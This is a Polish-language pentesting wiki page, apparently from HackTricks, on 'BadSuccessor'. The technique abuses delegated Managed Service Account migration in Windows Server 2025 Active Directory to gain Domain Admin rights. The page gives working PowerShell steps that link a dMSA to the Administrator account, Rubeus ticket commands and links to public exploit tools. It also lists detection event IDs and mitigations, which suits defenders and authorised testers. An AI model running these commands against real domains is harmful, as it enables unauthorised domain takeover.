# BadSuccessor: Eskalacja uprawnień poprzez nadużycie migracji delegowanych MSA

{{#include ../../banners/hacktricks-training.md}}

## Przegląd

Delegowane Konta Usługowe (**dMSA**) są następną generacją następców **gMSA**, które będą dostępne w Windows Server 2025. Legalny proces migracji pozwala administratorom na zastąpienie *starego* konta (użytkownika, komputera lub konta usługi) dMSA, jednocześnie zachowując uprawnienia. Proces ten jest udostępniany za pomocą poleceń PowerShell, takich jak `Start-ADServiceAccountMigration` i `Complete-ADServiceAccountMigration`, i opiera się na dwóch atrybutach LDAP obiektu **dMSA**:

* **`msDS-ManagedAccountPrecededByLink`** – *link DN* do zastąpionego (starego) konta.
* **`msDS-DelegatedMSAState`**       – stan migracji (`0` = brak, `1` = w toku, `2` = *ukończony*).

Jeśli atakujący może stworzyć **jakiekolwiek** dMSA w obrębie OU i bezpośrednio manipulować tymi 2 atrybutami, LSASS i KDC będą traktować dMSA jako *następcę* powiązanego konta. Kiedy atakujący następnie uwierzytelni się jako dMSA, **dziedziczy wszystkie uprawnienia powiązanego konta** – aż do **Administratora Domeny**, jeśli konto Administratora jest powiązane.

Technika ta została nazwana **BadSuccessor** przez Unit 42 w 2025 roku. W momencie pisania **żaden patch zabezpieczeń** nie jest dostępny; jedynie wzmocnienie uprawnień OU łagodzi problem.

### Wymagania wstępne ataku

1. Konto, które jest *dozwolone* do tworzenia obiektów w **Jednostce Organizacyjnej (OU)** *i* ma przynajmniej jedno z:
* `Create Child` → **`msDS-DelegatedManagedServiceAccount`** klasa obiektów
* `Create Child` → **`All Objects`** (ogólne tworzenie)
2. Łączność sieciowa z LDAP i Kerberos (standardowy scenariusz dołączony do domeny / atak zdalny).

## Enumeracja podatnych OU

Unit 42 wydało skrypt pomocniczy PowerShell, który analizuje deskryptory zabezpieczeń każdej OU i podkreśla wymagane ACE:
```powershell
Get-BadSuccessorOUPermissions.ps1 -Domain contoso.local
```
Pod maską skrypt wykonuje paginowane wyszukiwanie LDAP dla `(objectClass=organizationalUnit)` i sprawdza każdy `nTSecurityDescriptor` pod kątem

* `ADS_RIGHT_DS_CREATE_CHILD` (0x0001)
* `Active Directory Schema ID: 31ed51fa-77b1-4175-884a-5c6f3f6f34e8` (klasa obiektów *msDS-DelegatedManagedServiceAccount*)

## Kroki Eksploatacji

Gdy zidentyfikowane zostanie zapisywalne OU, atak jest tylko 3 zapisami LDAP od celu:
```powershell
# 1. Create a new delegated MSA inside the delegated OU
New-ADServiceAccount -Name attacker_dMSA \
-DNSHostName host.contoso.local \
-Path "OU=DelegatedOU,DC=contoso,DC=com"

# 2. Point the dMSA to the target account (e.g. Domain Admin)
Set-ADServiceAccount attacker_dMSA -Add \
@{msDS-ManagedAccountPrecededByLink="CN=Administrator,CN=Users,DC=contoso,DC=com"}

# 3. Mark the migration as *completed*
Set-ADServiceAccount attacker_dMSA -Replace @{msDS-DelegatedMSAState=2}
```
Po replikacji atakujący może po prostu **zalogować się** jako `attacker_dMSA$` lub zażądać Kerberos TGT – Windows zbuduje token *zastąpionego* konta.

### Automatyzacja

Kilka publicznych PoC obejmuje cały proces, w tym odzyskiwanie haseł i zarządzanie biletami:

* SharpSuccessor (C#) – [https://github.com/logangoins/SharpSuccessor](https://github.com/logangoins/SharpSuccessor)
* BadSuccessor.ps1 (PowerShell) – [https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1](https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1)
* Moduł NetExec – `badsuccessor` (Python) – [https://github.com/Pennyw0rth/NetExec](https://github.com/Pennyw0rth/NetExec)

### Post-eksploatacja
```powershell
# Request a TGT for the dMSA and inject it (Rubeus)
Rubeus asktgt /user:attacker_dMSA$ /password:<ClearTextPwd> /domain:contoso.local
Rubeus ptt /ticket:<Base64TGT>

# Access Domain Admin resources
dir \\DC01\C$
```
## Wykrywanie i Polowanie

Włącz **Audyt Obiektów** w OU i monitoruj następujące zdarzenia zabezpieczeń systemu Windows:

* **5137** – Utworzenie obiektu **dMSA**
* **5136** – Modyfikacja **`msDS-ManagedAccountPrecededByLink`**
* **4662** – Zmiany w konkretnych atrybutach
* GUID `2f5c138a-bd38-4016-88b4-0ec87cbb4919` → `msDS-DelegatedMSAState`
* GUID `a0945b2b-57a2-43bd-b327-4d112a4e8bd1` → `msDS-ManagedAccountPrecededByLink`
* **2946** – Wydanie TGT dla dMSA

Korelacja `4662` (modyfikacja atrybutu), `4741` (utworzenie konta komputera/usługi) i `4624` (kolejne logowanie) szybko ujawnia aktywność BadSuccessor. Rozwiązania XDR, takie jak **XSIAM**, dostarczają gotowe zapytania (zobacz odniesienia).

## Łagodzenie

* Zastosuj zasadę **najmniejszych uprawnień** – deleguj zarządzanie *Konto Usługi* tylko zaufanym rolom.
* Usuń `Create Child` / `msDS-DelegatedManagedServiceAccount` z OU, które tego nie wymagają.
* Monitoruj identyfikatory zdarzeń wymienione powyżej i alarmuj o *tożsamościach spoza Tier-0*, które tworzą lub edytują dMSA.

## Zobacz także

{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

## Odniesienia

- [Unit42 – Kiedy dobre konta stają się złe: Wykorzystywanie delegowanych kont usług](https://unit42.paloaltonetworks.com/badsuccessor-attack-vector/)
- [SharpSuccessor PoC](https://github.com/logangoins/SharpSuccessor)
- [BadSuccessor.ps1 – Kolekcja narzędzi pentestingowych](https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1)
- [Moduł BadSuccessor NetExec](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/badsuccessor.py)

{{#include ../../banners/hacktricks-training.md}}
